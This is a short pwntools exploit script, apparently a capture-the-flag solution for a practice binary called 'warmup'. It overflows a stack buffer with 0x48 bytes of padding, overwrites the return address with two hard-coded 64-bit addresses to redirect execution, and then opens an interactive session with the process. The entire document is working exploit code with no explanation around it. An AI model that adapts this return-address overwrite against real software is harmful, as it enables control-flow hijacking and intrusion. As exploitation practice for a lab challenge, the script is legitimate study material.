from pwn import *

target = process("./warmup")

payload = b"a" * 0x48
payload += p64(0x40061c)
payload += p64(0x40060d)

target.sendline(payload)

target.interactive()
                      